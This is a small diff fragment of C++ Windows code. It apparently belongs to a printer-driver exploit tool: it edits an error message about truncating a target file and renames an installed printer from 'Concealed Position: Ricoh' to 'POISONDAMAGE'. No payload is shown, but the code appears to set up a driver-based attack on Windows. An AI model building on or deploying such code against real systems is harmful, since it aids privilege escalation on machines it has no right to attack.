@@ -44,7 +44,7 @@ namespace
         else
         {
             // standard behavior on first install though
-            std::cerr << "[!] File " << p_target << " could not be truncated" << std::endl;
+            std::wcerr << "[!] File " << p_target << " could not be truncated. Likely first install." << std::endl;
         }
     }
 
@@ -136,7 +136,7 @@ namespace
         ZeroMemory(&printerInfo, sizeof(printerInfo));
         printerInfo.pPortName = (LPWSTR)L"lpt1:";
         printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
-        printerInfo.pPrinterName = (LPWSTR)L"Concealed Position: Ricoh";
+        printerInfo.pPrinterName = (LPWSTR)L"POISONDAMAGE";
         printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
         printerInfo.pDatatype = (LPWSTR)L"RAW";
         printerInfo.pComment = (LPWSTR)L"Poison Damage";
